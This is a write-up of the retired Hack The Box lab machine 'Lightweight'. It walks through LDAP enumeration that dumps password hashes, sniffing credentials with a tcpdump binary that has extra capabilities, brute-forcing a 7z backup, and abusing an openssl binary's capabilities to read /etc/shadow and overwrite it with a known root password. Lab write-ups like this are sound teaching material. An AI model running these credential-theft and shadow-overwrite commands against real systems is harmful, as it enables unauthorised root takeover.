---
layout: post
title: Hack The Box - Lightweight
categories: hack-the-box
image: /hackthebox/lightweight/0.png
---
<hr>
### Quick Summary 
#### Hey guys today Lightweight retired and here's my write-up about it. Lightweight was a simple and a straightforward machine, I had fun solving it and I liked it. The idea behind the box is simple, We get initial ssh access then keep escalating privileges until we reach root. It's a linux machine and its ip is `10.10.10.119`, I added it to `/etc/hosts` as `lightweight.htb`. Let's jump right in.
![](/images/hackthebox/lightweight/0.png)
<hr>
### Nmap
#### As always we will start with nmap to scan for open ports and services :
`nmap -sV -sT -sC lightweight.htb`
![](/images/hackthebox/lightweight/1.png)
#### 3 ports are open : 22 running ssh, 80 running http and 389 running ldap. Let's check ldap first.
<br>
<hr>
### Ldap Enumeration
#### To enumerate ldap I like to use a tool called `ldapsearch`, There's also an `nmap` script called `ldap-search` that can do the same thing.
#### `ldapsearch` :
`ldapsearch -x -h lightweight.htb -b "dc=lightweight,dc=htb"`
#### Full Output :
```
# extended LDIF
#
# LDAPv3
# base <dc=lightweight,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# lightweight.htb
dn: dc=lightweight,dc=htb
objectClass: top
objectClass: dcObject
objectClass: organization
o: lightweight htb
dc: lightweight

# Manager, lightweight.htb
dn: cn=Manager,dc=lightweight,dc=htb
objectClass: organizationalRole
cn: Manager
description: Directory Manager

# People, lightweight.htb
dn: ou=People,dc=lightweight,dc=htb
objectClass: organizationalUnit
ou: People

# Group, lightweight.htb
dn: ou=Group,dc=lightweight,dc=htb
objectClass: organizationalUnit
ou: Group

# ldapuser1, People, lightweight.htb
dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
uid: ldapuser1
cn: ldapuser1
sn: ldapuser1
mail: ldapuser1@lightweight.htb
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: top
objectClass: shadowAccount
userPassword:: e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2R
 oai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv
shadowLastChange: 17691
shadowMin: 0
shadowMax: 99999
shadowWarning: 7
loginShell: /bin/bash
uidNumber: 1000
gidNumber: 1000
homeDirectory: /home/ldapuser1

# ldapuser2, People, lightweight.htb
dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
uid: ldapuser2
cn: ldapuser2
sn: ldapuser2
mail: ldapuser2@lightweight.htb
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: top
objectClass: shadowAccount
userPassword:: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms
 zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x
shadowLastChange: 17691
shadowMin: 0
shadowMax: 99999
shadowWarning: 7
loginShell: /bin/bash
uidNumber: 1001
gidNumber: 1001
homeDirectory: /home/ldapuser2

# ldapuser1, Group, lightweight.htb
dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
objectClass: posixGroup
objectClass: top
cn: ldapuser1
userPassword:: e2NyeXB0fXg=
gidNumber: 1000

# ldapuser2, Group, lightweight.htb
dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
objectClass: posixGroup
objectClass: top
cn: ldapuser2
userPassword:: e2NyeXB0fXg=
gidNumber: 1001

# search result
search: 2
result: 0 Success

# numResponses: 9
# numEntries: 8

```
#### `nmap` :
`nmap --script=ldap-search lightweight.htb`
#### Full Output :
```
# Nmap 7.70 scan initiated Fri May 10 17:10:46 2019 as: nmap --script=ldap-search -o ldap.nmap lightweight.htb
Nmap scan report for lightweight.htb (10.10.10.119)
Host is up (0.17s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
389/tcp open  ldap
| ldap-search: 
|   Context: dc=lightweight,dc=htb
|     dn: dc=lightweight,dc=htb
|         objectClass: top
|         objectClass: dcObject
|         objectClass: organization
|         o: lightweight htb
|         dc: lightweight
|     dn: cn=Manager,dc=lightweight,dc=htb
|         objectClass: organizationalRole
|         cn: Manager
|         description: Directory Manager
|     dn: ou=People,dc=lightweight,dc=htb
|         objectClass: organizationalUnit
|         ou: People
|     dn: ou=Group,dc=lightweight,dc=htb
|         objectClass: organizationalUnit
|         ou: Group
|     dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
|         uid: ldapuser1
|         cn: ldapuser1
|         sn: ldapuser1
|         mail: ldapuser1@lightweight.htb
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: shadowAccount
|         userPassword: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
|         shadowLastChange: 17691
|         shadowMin: 0
|         shadowMax: 99999
|         shadowWarning: 7
|         loginShell: /bin/bash
|         uidNumber: 1000
|         gidNumber: 1000
|         homeDirectory: /home/ldapuser1
|     dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
|         uid: ldapuser2
|         cn: ldapuser2
|         sn: ldapuser2
|         mail: ldapuser2@lightweight.htb
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: inetOrgPerson
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: shadowAccount
|         userPassword: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
|         shadowLastChange: 17691
|         shadowMin: 0
|         shadowMax: 99999
|         shadowWarning: 7
|         loginShell: /bin/bash
|         uidNumber: 1001
|         gidNumber: 1001
|         homeDirectory: /home/ldapuser2
|     dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: ldapuser1
|         userPassword: {crypt}x
|         gidNumber: 1000
|     dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: ldapuser2
|         userPassword: {crypt}x
|_        gidNumber: 1001

# Nmap done at Fri May 10 17:11:03 2019 -- 1 IP address (1 host up) scanned in 17.35 seconds

```
#### If we take a look at `ldapsearch` results :
![](/images/hackthebox/lightweight/2.png)
<br>
<br>
![](/images/hackthebox/lightweight/3.png)
#### We have some info for 2 users : `ldapuser1` and `ldapuser2`. `userPassword` is a base64 encoded string. I decoded it and got the same hashes I got from `ldap-search` `nmap` script :
![](/images/hackthebox/lightweight/4.png)
#### However, I tried to crack the hashes and they didn't crack. Let's check http.
<br>
<hr>
### HTTP 
#### Usually I use some tools for web like `gobuster` for example, But this time We can't do that because we will get blocked as you can see :
![](/images/hackthebox/lightweight/5.png)
#### Also the `info` page is saying the same thing :
![](/images/hackthebox/lightweight/6.png)
#### And it's also saying `If you like to get in the box, please go to the user page`. Let's check `user` :
![](/images/hackthebox/lightweight/7.png)
#### So we can login with ssh with the ip as the username and the password. Let's try :
![](/images/hackthebox/lightweight/8.png)
#### It's working !
<br>
<hr>
### Tcpdump Capabilities, User Flag
#### One of the things I always check when enumerating linux filesystem is the binary capabilities. So I used `getcap` on some directories like `/bin`, `/usr/bin` and `/usr/sbin`. I noticed that `tcpdump` has `cap_net_admin,cap_net_raw+ep` capabilities.
![](/images/hackthebox/lightweight/9.png)
#### From the [Linux Capabilities Manual](http://man7.org/linux/man-pages/man7/capabilities.7.html) I found some info about these capabilities :
```
**CAP_NET_ADMIN**
              Perform various network-related operations:
              * interface configuration;
              * administration of IP firewall, masquerading, and accounting;
              * modify routing tables;
              * bind to any address for transparent proxying;
              * set type-of-service (TOS)
              * clear driver statistics;
              * set promiscuous mode;
              * enabling multicasting;
              * use [setsockopt(2)](http://man7.org/linux/man-pages/man2/setsockopt.2.html) to set the following socket options:
                **SO_DEBUG**, **SO_MARK**, **SO_PRIORITY** (for a priority outside the
                range 0 to 6), **SO_RCVBUFFORCE**, and **SO_SNDBUFFORCE**.
```
<br>
```
 **CAP_NET_RAW**
              * Use RAW and PACKET sockets;
              * bind to any address for transparent proxying.
```
#### Great. I ran `tcpdump` on all the interfaces and saved the output to `captured.pcap` and I left it for some time :
`tcpdump -i any -w captured.pcap`
![](/images/hackthebox/lightweight/10.png)
#### I downloaded the `pcap` on my box to open it with `wireshark` :
`scp 10.10.xx.xx@lightweight.htb:/home/10.10.xx.xx/captured.pcap ./`
![](/images/hackthebox/lightweight/11.png)
#### In `wireshark` I noticed an `LDAP` request :
![](/images/hackthebox/lightweight/12.png)
#### I looked at it and found that it's an authentication request :
![](/images/hackthebox/lightweight/13.png)
#### Now we have the password for `ldapuser2` :	`8bc8251332abe1d7f105d3e53ad39ac2`. Lets `su` :
![](/images/hackthebox/lightweight/14.png)
<br>
<br>
![](/images/hackthebox/lightweight/15.png)
#### We owned user.
<br>
<hr>
### Bruteforcing `7z`, Hardcoded Credentials, Privilege Escalation to `ldapuser1`
#### In the `/home` directory of `ldapuser2` there was a backup file called `backup.7z`. I tried to extract it but it was password protected :
![](/images/hackthebox/lightweight/16.png)
#### So I transferred it to my box to bruteforce it (`nc` wasn't installed and I couldn't use `scp` so I transferred it with base64 encoding/decoding) :
![](/images/hackthebox/lightweight/17.png)
<br>
<br>
![](/images/hackthebox/lightweight/18.png)
<br>
<br>
![](/images/hackthebox/lightweight/19.png)
#### I used [this tool](https://github.com/Seyptoo/7z-BruteForce) to bruteforce the `7z` file :
`python 7z.py backup.7z /usr/share/wordlists/rockyou.txt`
![](/images/hackthebox/lightweight/20.png)
#### The password is `delete`. After extraction we have some `php` files, Looks like the source of the web site hosted on port 80 :
![](/images/hackthebox/lightweight/21.png)
#### I checked them all and in `status.php` I found hardcoded credentials for `ldapuser1` :
![](/images/hackthebox/lightweight/22.png)
#### Now we can `su` to `ldapuser1` with the password : `f3ca9d298a553da117442deeb6fa932d` :
![](/images/hackthebox/lightweight/23.png)
<hr>
### Openssl Capabilities, Root Flag 
#### I looked at the contents of `/home/ldapuser1` and I noticed some stuff. A `php` file called `ldapTLS.php` and two binaries : `openssl` and `tcpdump`.
![](/images/hackthebox/lightweight/24.png)
<br>
`cat ldapTLS.php`
![](/images/hackthebox/lightweight/25.png)
#### Nothing interesting. Lets check the binaries. (We don't need `tcpdump` anymore so we will focus on `openssl`) 
#### I checked the capabilities and I found that `openssl` has the `ep` capability which means it can read and write anything on the filesystem. 
![](/images/hackthebox/lightweight/26.png)
#### This  means that we can simply read the root flag by using the base64 encoding function in `openssl` then decoding the file :
`./openssl enc -base64 -in /root/root.txt -out ./root.txt.b64`
<br>
<br>
`base64 -d root.txt.b64`
![](/images/hackthebox/lightweight/27.png)
#### We can also get a root shell by overwriting `/etc/passwd` or `/etc/shadow`. I got a copy of the original `shadow` file first :
`./openssl enc -base64 -in /etc/shadow -out ./shadow.b64`
<br>
<br>
`base64 -d shadow.b64 > shadow`
<br>
<br>
![](/images/hackthebox/lightweight/28.png)
#### I used `openssl` to create a salted password. I used `root` as the salt and `rick` as the password :
`openssl passwd -1 -salt root rick`
![](/images/hackthebox/lightweight/29.png)
#### Then I edited the copy I have of `/etc/shadow` and replaced the root password with the new one :
![](/images/hackthebox/lightweight/30.png)
#### And finally I used `openssl` to replace the old `/etc/shadow` with the new one and after that we can do `su root` with the password `rick`:
`./openssl enc -in shadow -out /etc/shadow`
![](/images/hackthebox/lightweight/31.png)
#### And we owned root !
<br>
<br>
#### That's it , Feedback is appreciated !
#### Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter for awesome resources [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
#### Thanks for reading.
<br>
<br>
#### Previous Hack The Box write-up : [Hack The Box - BigHead](/hack-the-box/bighead/)
#### Next Hack The Box write-up : [Hack The Box - Conceal](/hack-the-box/conceal/)
<hr>
